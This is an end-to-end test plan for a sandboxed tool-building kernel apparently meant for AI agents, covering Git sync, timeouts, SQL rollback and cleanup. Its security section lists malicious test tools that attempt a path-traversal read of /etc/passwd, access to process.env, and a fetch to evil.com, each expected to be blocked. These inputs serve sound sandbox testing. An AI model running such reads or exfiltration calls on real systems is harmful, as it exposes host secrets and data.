# End-to-End Test Plan (Real Implementation)

**Rules:**
1.  **No Mock, No Spy**: Tests run against the built `bin/tgp.js` or the public API entry point using real dependencies (Git, SQLite, V8).
2.  **Real Implementation**: Verification involves checking the actual effects on the filesystem, git history, and database state.
3.  **Isolated**: Each test runs in a unique, ephemeral directory (`/tmp/tgp-e2e-${uuid}`).
4.  **Idempotent**: Tests can be re-run without manual cleanup (handled by isolation), and operations within tests should handle existing state gracefully.
5.  **Clean on SIGTERM**: Test harness must ensure child processes and temp files are cleaned up if the test process is interrupted.

## 1. The "Cold Start" Lifecycle (GitOps + Compilation)
**Story**: An agent wakes up in a serverless environment, connects to a repo, builds a tool, uses it, and shuts down.

1.  **Setup Environment**:
    -   Create `bare-repo.git` (The Remote).
    -   Create `config.ts` pointing to `bare-repo.git`.
2.  **Agent Boot**:
    -   Initialize TGP Kernel.
    -   **Assert**: Local filesystem is clean (except for `.git` hydration).
3.  **Task**: "Create a fibonacci tool".
    -   Agent calls `write_file('tools/math/fib.ts', ...)` (Real TS code).
    -   Agent calls `check_tool('tools/math/fib.ts')`. **Assert**: Valid.
4.  **Execution**:
    -   Agent calls `exec_tool('tools/math/fib.ts', { n: 10 })`.
    -   **Assert**: Result is `55`.
5.  **Shutdown & Persist**:
    -   Kernel calls `sync()`.
    -   Process exits.
6.  **Verification (The "Next" Agent)**:
    -   Clone `bare-repo.git` to a **new** directory.
    -   Check file existence: `tools/math/fib.ts`.
    -   **Assert**: File content matches exactly.

## 2. Multi-Agent Concurrency (The "Merge" Test)
**Story**: Two agents forge tools simultaneously. TGP must handle Git locking and merging without human intervention.

1.  **Setup**:
    -   Initialize `bare-repo.git`.
    -   Instantiate **Agent A** in `dir_A` and **Agent B** in `dir_B` (both pointing to `bare-repo.git`).
2.  **Parallel Action**:
    -   Agent A creates `tools/math/add.ts`.
    -   Agent B creates `tools/math/subtract.ts`.
3.  **Race Condition**:
    -   Agent A calls `sync()` (Push succeeds).
    -   Agent B calls `sync()` immediately after.
        -   **Expect**: Git push rejected (non-fast-forward).
        -   **Auto-Resolution**: TGP kernel catches error, pulls (rebase/merge), and pushes again.
4.  **Verification**:
    -   Inspect `bare-repo.git` history.
    -   **Assert**: Both `add.ts` and `subtract.ts` exist in HEAD.
    -   **Assert**: Commit history is linear or cleanly merged.

## 3. The "Refactor" Scenario (Search & Replace)
**Story**: An existing tool is broken/outdated. Agent must patch it.

1.  **Pre-condition**: `tools/legacy.ts` exists with `console.log("old")`.
2.  **Agent Action**:
    -   Agent reads file.
    -   Agent calls `patch_file('tools/legacy.ts', ...)` to replace `console.log` with `return`.
3.  **Verification**:
    -   Run `exec_tool`.
    -   **Assert**: Output is returned value, not undefined.
    -   Read file from disk. **Assert**: Content is updated.
    -   **Git Verify**: Change is staged/committed in local repo (if auto-commit is on).

## 4. The "Infinite Loop" Self-Defense (Resilience)
**Story**: Agent generates malicious/buggy code that freezes.

1.  **Action**: Agent creates `tools/freeze.ts` (`while(true){}`).
2.  **Execution**: Agent calls `exec_tool('tools/freeze.ts')`.
3.  **Observation**:
    -   Function call throws exception `ERR_ISOLATE_TIMEOUT`.
    -   Exception is caught by Kernel.
    -   **Assert**: Main process (The Agent) remains alive and responsive.
    -   **Assert**: Memory usage of Main process is stable (V8 isolate disposed).

## 5. Security & Sandbox Jailbreak
**Story**: Malicious tool attempts to access host resources.

1.  **Filesystem Escape**:
    -   Create tool `tools/hack.ts` attempting `read_file('../../../etc/passwd')`.
    -   Execute. **Assert**: Throws `SecurityViolation`.
2.  **Environment Theft**:
    -   Create tool `tools/env.ts` attempting to access `process.env`.
    -   Execute. **Assert**: Throws `ReferenceError` (process is not defined).
3.  **Network Exfiltration**:
    -   Create tool `tools/curl.ts` attempting `fetch('http://evil.com')`.
    -   Execute. **Assert**: Throws `NetworkError` or `SecurityViolation` (not in whitelist).

## 6. Database Transaction Safety (SQL)
**Story**: A tool performs SQL operations. Logic error triggers rollback.

1.  **Setup**:
    -   Initialize real SQLite DB `test.db` with table `logs`.
2.  **Success Path**:
    -   Tool executes `INSERT INTO logs VALUES ('ok')`.
    -   **Assert**: Row count = 1.
3.  **Failure Path (Rollback)**:
    -   Tool executes:
        ```typescript
        sql('INSERT INTO logs VALUES ("bad")');
        throw new Error("Logic Crash");
        ```
    -   Kernel catches error.
    -   **Assert**: Row count = 1 (The "bad" row was rolled back).

## 7. The "SIGTERM" Cleanliness Test
**Story**: Deployment platform kills the pod while tool is running.

1.  **Setup**:
    -   Start TGP process that writes to a database loop or holds a file lock.
2.  **Action**:
    -   Send `SIGTERM` to process.
3.  **Verification**:
    -   Check Database locks. **Assert**: Released (WAL file clean).
    -   Check Temporary Files (`/tmp/tgp-*`). **Assert**: Deleted/Cleaned up.
    -   Check Git Lock files (`index.lock`). **Assert**: Cleared.

## 8. CLI Bootstrap Test
**Story**: Developer initializes project.

1.  **Action**: Exec `node bin/tgp.js init` in empty dir.
2.  **Assert**:
    -   `tgp.config.ts` created.
    -   `.tgp` folder structure created.
    -   `package.json` updated (if applicable).
    -   Run `node bin/tgp.js check`. **Assert**: Passes with no tools.
